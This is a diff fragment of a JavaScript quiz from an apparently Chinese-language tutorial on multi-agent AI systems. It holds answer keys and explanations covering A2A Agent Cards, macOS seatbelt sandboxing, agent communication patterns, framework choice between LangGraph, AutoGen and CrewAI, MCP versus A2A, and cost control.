+    explanation: 'Agent Card是A2A协议中的能力发现机制——每个Agent发布一个JSON元数据文件，描述自己的能力、技能和交互协议，让其他Agent可以"读简历、识能力"。'
+  },
+  {
+    type: 'single',
+    question: '以下哪种沙箱方案最适合macOS环境的轻量级隔离？',
+    options: ['Docker Sandbox', 'bubblewrap', 'seatbelt', 'E2B'],
+    answer: [2],
+    explanation: 'seatbelt是macOS内置的沙箱机制，通过sandbox-exec命令配置权限策略，是macOS上最成熟的轻量进程级沙箱方案。'
+  },
+  {
+    type: 'multiple',
+    question: '以下哪些是多 Agent 的通信机制？（多选）',
+    options: ['消息传递', '共享黑板', '图结构', '数据库查询'],
+    answer: [0, 1, 2],
+    explanation: '三种通信机制：消息传递（AutoGen）、共享黑板（CrewAI）、图结构（LangGraph）。数据库查询不是 Agent 间的通信机制。'
+  },
+  {
+    type: 'multiple',
+    question: '关于串行流水线模式，以下说法正确的是？（多选）',
+    options: [
+      '每个 Agent 处理一个阶段，输出传给下一个',
+      '实现简单可靠',
+      '可以并行执行多个子任务',
+      '总耗时等于各阶段耗时之和'
+    ],
+    answer: [0, 1, 3],
+    explanation: '串行流水线是串行执行，无法并行。总耗时等于各阶段耗时之和。简单可靠但效率不如并行模式。'
+  },
+  {
+    type: 'multiple',
+    question: '选择多 Agent 框架时，以下考虑因素哪些是正确的？（多选）',
+    options: [
+      '需要精确控制流程 → 选 LangGraph',
+      '需要灵活自由协作 → 选 AutoGen',
+      '需要简单易上手 → 选 CrewAI',
+      '所有场景都应该选 AutoGen'
+    ],
+    answer: [0, 1, 2],
+    explanation: '没有"万能框架"：要可控选 LangGraph，要灵活选 AutoGen，要简单选 CrewAI。根据场景需求选择。'
+  },
+  {
+    type: 'multiple',
+    question: 'A2A协议与MCP协议的区别包括哪些？（多选）',
+    options: [
+      'MCP管Agent与工具的连接，A2A管Agent与Agent的连接',
+      'A2A有Agent Card能力发现机制，MCP无此机制',
+      'MCP是单向调用，A2A是双向协作',
+      '两者是竞争关系，只能选其中一个'
+    ],
+    answer: [0, 1, 2],
+    explanation: 'MCP和A2A是互补而非竞争关系：MCP让Agent有"手"（使用工具），A2A让Agent有"嘴"（与其他Agent协作），一个完整生态两者缺一不可。'
+  },
+  {
+    type: 'multiple',
+    question: '多Agent生产实践中，成本控制的策略包括哪些？（多选）',
+    options: [
+      '按需分配：编排者只在需要时才调用Agent',
+      '精简Prompt：每个Agent只包含自己的工具和规则',
+      '分级模型：简单任务用小模型，复杂任务用大模型',
+      '增加Agent数量以分担负载'
+    ],
+    answer: [0, 1, 2],
+    explanation: '增加Agent数量反而会增加Token消耗（成本倍增效应）。成本控制应该是减少无效调用、精简上下文、合理选模型，而非盲目增加Agent。'
+  }
+];
+
+setTimeout(() => { Quiz.render('quizArea', ch07Questions); }, 500);
+</script>
